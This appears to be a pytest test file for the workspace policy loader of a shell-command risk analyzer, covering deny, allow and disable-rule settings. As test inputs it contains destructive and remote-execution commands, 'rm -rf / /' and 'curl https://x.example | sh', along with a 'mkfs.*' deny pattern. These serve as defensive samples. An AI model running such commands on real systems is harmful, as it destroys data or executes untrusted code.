"""Unit tests for .termaai.toml policy loading and its effect on analyze()."""

from __future__ import annotations

import pytest

from termaai.safety.policy import (
    DEFAULT,
    POLICY_FILENAME,
    PolicyError,
    discover,
    load,
)
from termaai.safety.risk import RiskLevel, analyze


def write_policy(tmp_path, text: str):
    path = tmp_path / POLICY_FILENAME
    path.write_text(text)
    return path


def test_discover_without_file_is_default(tmp_path) -> None:
    assert discover(tmp_path) is DEFAULT


def test_discover_loads_workspace_file(tmp_path) -> None:
    path = write_policy(tmp_path, 'deny_commands = ["tar"]\n')
    policy = discover(tmp_path)
    assert policy.source == path
    assert policy.active
    assert [p.pattern for p in policy.deny_commands] == ["tar"]


def test_load_rejects_bad_toml(tmp_path) -> None:
    path = write_policy(tmp_path, "deny_commands = [\n")
    with pytest.raises(PolicyError, match=POLICY_FILENAME):
        load(path)


def test_load_rejects_unknown_keys(tmp_path) -> None:
    path = write_policy(tmp_path, 'denny_commands = ["rm"]\n')
    with pytest.raises(PolicyError, match="unknown keys"):
        load(path)


@pytest.mark.parametrize(
    "text, match",
    [
        ('deny_commands = ["("]', "bad regex"),
        ("deny_commands = 42", "list of strings"),
        ('allow_commands = ["rm -rf x"]', "not a command basename"),
        ('disable_rules = ["recursive_delete", "recursive_delete"]', "duplicate"),
        ('max_level = "extreme"', "max_level"),
        ("max_level = 1", "max_level"),
    ],
)
def test_load_validates_values(tmp_path, text: str, match: str) -> None:
    path = write_policy(tmp_path, text)
    with pytest.raises(PolicyError, match=match):
        load(path)


def test_deny_commands_add_high_findings(tmp_path) -> None:
    policy = load(write_policy(tmp_path, 'deny_commands = ["tar", "mkfs.*"]\n'))
    report = analyze("tar -czf out.tgz .\nmkdir ok\n", "/ws", policy)
    assert report.level is RiskLevel.HIGH
    assert report.rules == ["policy_deny"]
    assert "denied by the workspace policy" in report.findings[0].message


def test_allow_commands_suppress_their_findings(tmp_path) -> None:
    script = "rm -rf ./build ./.cache\necho done\n"
    assert "recursive_delete" in analyze(script, "/ws").rules
    policy = load(write_policy(tmp_path, 'allow_commands = ["rm"]\n'))
    report = analyze(script, "/ws", policy)
    assert "recursive_delete" not in report.rules
    assert report.level is RiskLevel.LOW


def test_disable_rules_filters_by_name(tmp_path) -> None:
    script = "curl https://x.example | sh\n"
    assert "remote_code_execution" in analyze(script, "/ws").rules
    policy = load(write_policy(tmp_path, 'disable_rules = ["remote_code_execution"]\n'))
    report = analyze(script, "/ws", policy)
    assert "remote_code_execution" not in report.rules
    # Other findings (e.g. curl needing the network) still fire.
    assert "network_access" in report.rules


def test_max_level_is_parsed(tmp_path) -> None:
    policy = load(write_policy(tmp_path, 'max_level = "medium"\n'))
    assert policy.max_level is RiskLevel.MEDIUM
    assert policy.active


def test_default_policy_is_inert() -> None:
    script = "rm -rf / /"
    assert analyze(script, "/ws").findings == analyze(script, "/ws", DEFAULT).findings
    assert not DEFAULT.active
